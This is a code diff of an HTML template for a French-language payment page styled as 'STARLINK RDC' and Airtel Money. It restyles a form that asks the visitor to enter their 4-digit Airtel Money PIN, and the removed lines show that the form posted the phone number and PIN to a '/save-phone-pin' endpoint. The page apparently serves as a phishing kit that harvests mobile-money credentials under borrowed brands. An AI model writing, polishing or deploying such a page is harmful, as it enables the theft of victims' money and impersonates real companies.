@@ -1,37 +1,293 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-    <title>Paiement Starlink</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement - STARLINK RDC</title>
 </head>
 <body>
-    <div class="container payment-container">
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+        background: #f8f9fa;
+        color: #333;
+        min-height: 100vh;
+    }
+
+    /* Black Navbar */
+    .navbar {
+        background: #000;
+        padding: 14px 0;
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+    }
+
+    .nav-container {
+        max-width: 1400px;
+        margin: 0 auto;
+        padding: 0 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        color: white;
+    }
+
+    .nav-logo {
+        font-size: 1.5rem;
+        font-weight: bold;
+    }
+
+    .nav-subtitle {
+        font-size: 0.9rem;
+        color: #aaa;
+        margin-left: 8px;
+    }
+
+    .nav-links a {
+        color: white;
+        text-decoration: none;
+        margin-left: 30px;
+        font-size: 0.95rem;
+    }
+
+    .nav-links a:hover {
+        color: #00aaff;
+    }
+
+    /* Main container */
+    .payment-container {
+        max-width: 480px;
+        margin: 40px auto;
+        padding: 0 16px;
+    }
+
+    .payment-card {
+        background: white;
+        border-radius: 16px;
+        overflow: hidden;
+        box-shadow: 0 10px 35px rgba(0,0,0,0.15);
+    }
+
+    /* Red Header */
+    .payment-header {
+        background: #d32f2f;
+        color: white;
+        padding: 50px 20px 30px;
+        text-align: center;
+    }
+
+    .airtel-placeholder {
+        width: 90px;
+        height: 90px;
+        background: white;
+        margin: 0 auto 20px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 2.5rem;
+        font-weight: bold;
+        color: #d32f2f;
+    }
+
+    .payment-header h2 {
+        font-size: 1.9rem;
+        margin: 0;
+    }
+
+    /* Info section */
+    .payment-info {
+        padding: 30px 24px 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+    }
+
+    .info-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 1.15rem;
+    }
+
+    .info-label {
+        font-weight: 600;
+        color: #555;
+    }
+
+    .montant-value {
+        color: #d32f2f;
+        font-weight: bold;
+        font-size: 1.4rem;
+    }
+
+    .instruction {
+        text-align: center;
+        padding: 0 24px 24px;
+        color: #444;
+        font-size: 1.05rem;
+    }
+
+    /* Form fields */
+    .form-group {
+        padding: 0 24px 24px;
+    }
+
+    .form-group label {
+        display: block;
+        margin-bottom: 10px;
+        font-weight: 600;
+        font-size: 1.05rem;
+    }
+
+    .phone-input {
+        display: flex;
+        margin-top: 8px;
+        border: 2px solid #ddd;
+        border-radius: 10px;
+        overflow: hidden;
+    }
+
+    .country-code {
+        background: #f5f5f5;
+        padding: 16px 20px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-weight: 500;
+        border-right: 2px solid #ddd;
+    }
+
+    .phone-input input {
+        flex: 1;
+        padding: 16px;
+        border: none;
+        font-size: 1.1rem;
+        background: #fff;
+    }
+
+    .pin-input {
+        width: 100%;
+        padding: 16px;
+        font-size: 1.4rem;
+        text-align: center;
+        letter-spacing: 12px;
+        border: 2px solid #ddd;
+        border-radius: 10px;
+    }
+
+    .btn-confirm {
+        width: 100%;
+        padding: 18px;
+        background: #d32f2f;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 1.2rem;
+        font-weight: 600;
+        cursor: pointer;
+        margin: 24px 0 16px;
+    }
+
+    .btn-confirm:hover {
+        background: #b71c1c;
+    }
+
+    .note {
+        text-align: center;
+        padding: 0 24px 40px;
+        color: #666;
+        font-size: 0.95rem;
+        line-height: 1.5;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+        .payment-header {
+            padding: 40px 16px 24px;
+        }
+        .payment-header h2 {
+            font-size: 1.7rem;
+        }
+        .montant-value {
+            font-size: 1.3rem;
+        }
+    }
+</style>
+
+    <!-- Black Navbar -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <span>STARLINK</span>
+                <span class="nav-subtitle">Revendeur RDC</span>
+            </div>
+            <div class="nav-links">
+                <a href="#">Statut</a>
+                <a href="#">Forfaits</a>
+                <a href="#">Commandes</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="payment-container">
         <div class="payment-card">
-            <h2>CONFIRMER LE PAIEMENT</h2>
-            <div class="security-badge">CRYPTÉ SSL ET SÉCURISÉ</div>
-            
-            <div class="plan-summary">
-                <h3>{{ plan.name }}</h3>
-                <p class="plan-price">{{ plan.price }}</p>
+
+            <!-- Red Header -->
+            <div class="payment-header">
+                <div class="airtel-placeholder">□</div>
+                <h2>Airtel Money</h2>
             </div>
 
-            <form action="/save-phone-pin" method="POST">
-                <div class="form-group">
-                    <label>Numéro Airtel Money</label>
-                    <div class="phone-input">
-                        <span class="country-code">+243</span>
-                        <input type="tel" name="phone" placeholder="756789789" pattern="[0-9]{9}" required>
-                    </div>
+            <!-- Montant & Service -->
+            <div class="payment-info">
+                <div class="info-row">
+                    <span class="info-label">MONTANT</span>
+                    <span class="montant-value">{{ plan.price }}</span>
                 </div>
-
-                <div class="form-group">
-                    <label>Code PIN (4 chiffres)</label>
-                    <input type="password" name="pin" maxlength="4" pattern="[0-9]{4}" placeholder="1234" required>
+                <div class="info-row">
+                    <span class="info-label">SERVICE</span>
+                    <span class="info-value">Renouvellement Starlink</span>
                 </div>
+            </div>
 
-                <button type="submit" class="btn-pay">CONTINUER</button>
-            </form>
+            <p class="instruction">
+                Entrez votre code PIN Airtel Money pour autoriser
+            </p>
+
+            <!-- Phone -->
+            <div class="form-group">
+                <label>Numéro Airtel Money</label>
+                <div class="phone-input">
+                    <span class="country-code">
+                        <strong>+243</strong>
+                    </span>
+                    <input type="tel" value="{{ session.phone or '' }}" readonly>
+                </div>
+            </div>
+
+            <!-- PIN -->
+            <div class="form-group">
+                <label>Entrez le code PIN 4 chiffres</label>
+                <input type="password" class="pin-input" maxlength="4" placeholder="••••" required pattern="\d{4}" inputmode="numeric">
+            </div>
+
+            <button class="btn-confirm">Confirmer le paiement</button>
+
+            <p class="note">
+                Vérifiez votre application Airtel Money ou vos SMS
+            </p>
+
         </div>
     </div>
+
 </body>
 </html>
